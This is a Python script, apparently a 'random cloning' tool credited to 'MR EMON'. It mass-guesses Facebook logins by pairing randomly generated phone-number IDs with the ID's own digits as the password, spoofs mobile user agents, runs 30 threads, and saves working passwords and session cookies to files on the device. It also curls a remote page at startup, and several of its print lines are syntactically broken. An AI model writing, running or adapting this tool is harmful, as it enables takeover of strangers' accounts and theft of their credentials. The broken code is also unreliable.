from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
import os,sys,time,json,random,re,string,platform,base64,platform,uuid
import marshal
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install requests pip , install futures , pip install rich')
    os.system('python EMON.py')
    os.system("xdg-open https://youtube.com/channel/UCPErGt_PlIcbobfyCwle9HA")
from bs4 import BeautifulSoup
ugen = []
A = '\x1b[1;97m' 
B = '\x1b[1;96m' 
C = '\x1b[1;91m' 
D = '\x1b[1;92m'
M = '\033[1;31m'
H = '\033[1;32m'
N = '\x1b[1;37m'    
E = '\x1b[1;93m' 
F = '\x1b[1;94m'
G = '\x1b[1;95m'
P = '\033[1;37m'
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' #
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
KB = '{ KB }'
for xd in range(10000):
    a='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['6','7','8','9','10','11','12'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=f'{a} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
try:
    os.system('curl https://bacho1001.blogspot.com/2022/07/ua.html -o ua.html')
except:
    pass
sock=open('ua.html','r').read().splitlines()
def uaku():
    try:
        ua=open('bbnew.txt','r').read().splitlines()
        for ub in ua:
            ugen.append(ub)
    except:
        a=requests.get('https://bacho1001.blogspot.com/2022/07/ua.html').text
        ua=open('.user-agents.txt','w')
        aa=re.findall('line">(.*?)<',str(a))
        for un in aa:
            ua.write(un+'\n')
        ua=open('.user-agents.txt','r').read().splitlines()
loop = 0
cps = []
oks = []
twf = []

def clear():
    os.system('clear')
    print(logo)
logo = """\033[1;30m
                  â–‰â–‰â–‰â–‰
                 â–‚â–‰â–‰â–‰â–‰â–‚
                \033[1;33mâ•°â– â”›â”— â–•â•¯
                 â•² ðŸ‘… â•±
                 \033[1;32mâ•±â–”â•²â•±â–”â•²
               â•± â•±â–â•­â•®â–•â•² â•²
               â•² â•²â–â•­â•®â–•â•± â•±       \033[1;31mâ•”â•â•—  â•”â•¦â•—  â•”â•â•—
                \033[1;35m â•²â–‰â–‰â–‰â–‰â•±         \033[1;31mâ• â•â•£   â•‘   â• â•£
                \033[1;34m  â–â•­â•®â–•          \033[1;31mâ•© â•©   â•©   â•š  
                \033[1;34m  â–â–â–•â–•
                  â–â–â–•â–•
                \033[1;31m â•­â•° â•®â•­â•° â•®
               \033[1;39msá´œÊ™ \033[1;35má´‹á´€ \033[1;36mÊ™á´€á´€á´˜
\033[0;95mâ—â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â—\033[1;37mà¹‘Û©â™¡Û©à¹‘\033[0;95mâ—â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â—
\033[0;92m
 \033[1;31mâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•—  â–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ•—   â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— 
\033[1;32mâ–ˆâ–ˆâ•”â•â•â•â•â•â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—
\033[1;33mâ–ˆâ–ˆâ•‘     â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â–ˆâ–ˆâ•— â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘
\033[1;34mâ–ˆâ–ˆâ•‘     â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘
\033[1;35mâ•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘ â•šâ–ˆâ–ˆâ–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•
 \033[1;31mâ•šâ•â•â•â•â•â•â•šâ•â•  â•šâ•â•â•šâ•â•  â•šâ•â•â•šâ•â•  â•šâ•â•â•â•â•šâ•â•â•â•â•â• 
\033[0;95mâ—â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â—\033[1;37mà¹‘Û©â™¡Û©à¹‘\033[0;95mâ—â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â—
\033[1;39mâ”â–· \033[0;91mð™Šð™’ð™‰ð™€ð™    \033[1;39mâ—ˆâœ™â—ˆ\033[1;33m MR EMON
\033[1;39mâ”â–· \033[0;91mð™ð™€ð˜¼ð™ˆ     \033[1;39mâ—ˆâœ™â—ˆ\033[1;31m TEAM OF ATF
\033[1;39mâ”â–· \033[0;91mð™”ð™Šð™ð™ð™ð˜½ð™€  \033[1;39mâ—ˆâœ™â—ˆ \033[1;32mEMON TRICKER
\033[1;39mâ”â–· \033[0;91mð™ð˜¼ð˜¾ð™€ð˜½ð™Šð™Šð™† \033[1;39mâ—ˆâœ™â—ˆ \033[1;33mCH4ND.CH4ND
\033[1;39mâ”â–· \033[0;91mð™ð˜½ ð™‚ð™ð™Šð™ð™‹ \033[1;39mâ—ˆâœ™â—ˆ \033[1;34mFACEBOOK ZONE ðŸ™‚ðŸ™ˆ
\033[1;39mâ”â–· \033[0;91mð™’ð™‹ ð™‚ð™ð™Šð™ð™‹ \033[1;39mâ—ˆâœ™â—ˆ \033[1;35mSTARTING EXIT SELECT AND JOIN
\033[1;39mâ”â–· \033[0;91mð™Žð˜¼ð™ð™ð™ð˜¼ð™Ž  \033[1;39mâ—ˆâœ™â—ˆ \033[0;92mFREE AND ENJOY
\033[1;39mâ”â–· \033[0;91mð™‘ð™€ð™ð™Žð™„ð™Šð™‰  \033[1;39mâ—ˆâœ™â—ˆ \033[1;31m2.0
\033[1;39mâ”â–· \033[1;36mð™ð™€ð™€ð™‡ ð™ð™ƒð™€ ð™‹ð™Šð™’ð™€ð™ ð™Šð™ ð˜¾ð™ƒð˜¼ð™‰ð˜¿ ð™Šð™’ð™‰ð™€ð™ ð™Šð™ ð˜¼ð™ð™
\033[0;95mâ—â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â—\033[1;37mà¹‘Û©â™¡Û©à¹‘\033[0;95mâ—â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â—"""
#####     ####

def linex():
    print(f'\033[0;95mâ—â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â—\033[1;37mà¹‘Û©â™¡Û©à¹‘\033[0;95mâ—â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â—')
def checks(oks,cps,twf):
    if not len(oks) != 0:
        pass
    if len(cps) != 0:
        print('\n\n\x1b[1;97m TOTAL OK : \x1b[1;97m %s  \x1b[1;97mKB-OK.txt' % (
            H, P, str(len(oks))))
        print('\x1b[1;97m TOTAL CP :\x1b[1;97m   %s \x1b[1;97mKB-CP.txt' %
              (H, P, str(len(cps))))
        print('\x1b[1;97m TOTAL 2F :\x1b[1;97m   %s \x1b[1;97mKB-2F.txt' %
              (H, P, str(len(twf))))
        input("\x1b[1;97mPRESE ENTER TO BACK xyz  ")
        xyz()
loop = 0
cps = []
oks = []
twf = []
def cek_apk(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r %s[%s!%s] %s{ORANGE}SORRY THERE IS NO ACTIVE  APKS ÃƒÂ°Ã…Â¸Ã…Â½Ã‚Â®%s  '%(ORANGE))
    else:
        print(f'\r {GREEN}[ÃƒÂ¢Ã‹â€ Ã…Â¡] %sYOUR ACTIVE APPLICATION DETAILS :'%(GREEN))
        for i in range(len(game)):
            print(f"\r%s[%s] %s %s "%(N,i+1,game[i]. replace("Ditambahkan pada"," Ditambahkan pada"),N))
        #else:
            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r %s[%s!%s] %s{ORANGE}SORRY THERE IS NO EXPIRED APKS ÃƒÂ°Ã…Â¸Ã…Â½Ã‚Â®%s'%(ORANGE))
    else:
        print(f'\r ÃƒÂ°Ã…Â¸Ã…Â½Ã‚Â®  %{RED}sYOUR EXPIRED APKS DETAILS :'%(RED))
        for i in range(len(game)):
            print(f"\r%s[%s] %s %s "%(N,i+1,game[i]. replace("Kedaluwarsa"," Kedaluwarsa"),N))
            print(f"{GREEN}â—â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â—")
            print("clear")
  #____________#
def xyz():
    os.getuid
    os.system("clear")
    print('         \x1b[97m[\033[37;41m  THIS COMMAND MADE BY MR EMON \033[0;97m] ')
    os.system("xdg-open https://youtube.com/channel/UCPErGt_PlIcbobfyCwle9HA");print(logo)
    
    print('           \x1b[97m[\033[37;41m  SUBSCRIBE MY CHANNEL  \033[0;m] ')
    print(f"")
    print(f"[01]   {WHITE}START RANDOM CLONING")
    print(f"[E]     \033[1;31mEXIT PROGRAM ")
    print(f"")
    print(f"\033[0;95mâ—â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â—\033[1;37mà¹‘Û©â™¡Û©à¹‘\033[0;95mâ—â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â—")
    EMON = input(" \033[1;39mCHOOSE : ")
    if EMON in ["1","01"]:
        Random()
    elif EMON in ["E","e"]:
       exit()
    else:
        print('\033[1;31mINCORECT OPTION!\033[1;31m')
        xyz()

#_____________#
 
#_____________________#

def Random():
    user=[]
    os.getuid
    os.geteuid
    print(logo)
    print(f"")
    clear()
    print(f"          \x1b[97m[\033[37;41m  C O D E    M E N U   \033[0;m]")
    print(f"")
    linex()
    print(f"")
    print(' 0300 ,0301 ,0302h ,0333')
    print(f" 0341 ,0342 ,0345 ,0349")
    print(f" 0321 ,0316 ,0308 ,0309")
    print(f"")
    linex()
    code = input(' SELECT CODE : ')
    os.system("clear")
    print(logo)
    print(f"")
    print(f"          \x1b[97m[\033[37;41m  L I M I T   M E N U   \033[0;m]")
    print(f"")
    limit = int(input(' EXAMPLE: 1000, 2000, 5000, 10000, 50000\n\n PUT CLONING LIMIT: '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=30) as yaari:    
        clear()
        tl = str(len(user))
        print(f" {GREEN}TOTAL IDZ      \033[1;39mâ—ˆ\033[1;32mâœ™\033[1;39mâ—ˆ {RED}"+tl)
        print(f" {BLUE}NUMBER YOU PUT \033[1;39mâ—ˆ\033[1;32mâœ™\033[1;39mâ—ˆ  {RED}"+code)
        print(f" {WHITE}PROCESS HAS BEEN STARTED")
        print(f" {RED}TO STOP PROCESS Ctrl + Z ")
        print(f'\033[0;95mâ—â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â—\033[1;37mà¹‘Û©â™¡Û©à¹‘\033[0;95mâ—â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â—')
        for love in user:
            uid = code+love
            pwx = [love]
            yaari.submit(free,uid,pwx,tl)
def free(uid,pwx,tl):
    global loop
    global oks
    global agents
    try:
        for ps in pwx:
            bi = random.choice([A])
            session = requests.Session()
            pro = random.choice(ugen)
            free_fb = session.get('https://m.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority':'m.facebook.com',
            'method': 'POST',
            'scheme': 'https',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'accept-encoding':'utf-8','accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101"',
            'sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent':pro}
            lo = session.post('https://m.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print('\r[EMON-OK]\nNUMBER : '+uid+'\nPASSWORD   : '+cid+' ÃƒÂ¢Ã‹â€ Ã…Â¡ '+ps+ '\nCOOKIE   : '+coki+')
                cek_apk(session,coki)
                open('/sdcard/EMON-OK.txt', 'a').write(cid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid=coki[24:39]
                Red = '\033[1;31m'
                print(f'\r\033[1;31m [EMON-CP] \nNUMBER : '+uid+'\nPASSWORD   : '+ps+ ')
                open('/sdcard/EMON-CP.txt', 'a').write(cid+' | '+ps+'\n')
                cps.append(cid)
                break
            elif '/x/checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid=coki[7:22]
                Red = '\033[1;31m'
                print(f'\r{YELLOW}[TEMP-LOCK] '+cid+' | '+ps+'\033[1;97m')
                open('/sdcard/EMON-2F.txt', 'a').write(cid+' | '+ps+'\n')
                twf.append(cid)
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[EMON] [%s]\33[1;97m [OK:%s~CP:%s]'%(loop,len(oks),len(cps))), 
        sys.stdout.flush()
        checks(oks,cps,twf)
    except:
        pass

        
 
if __name__ == '__main__':
    xyz()
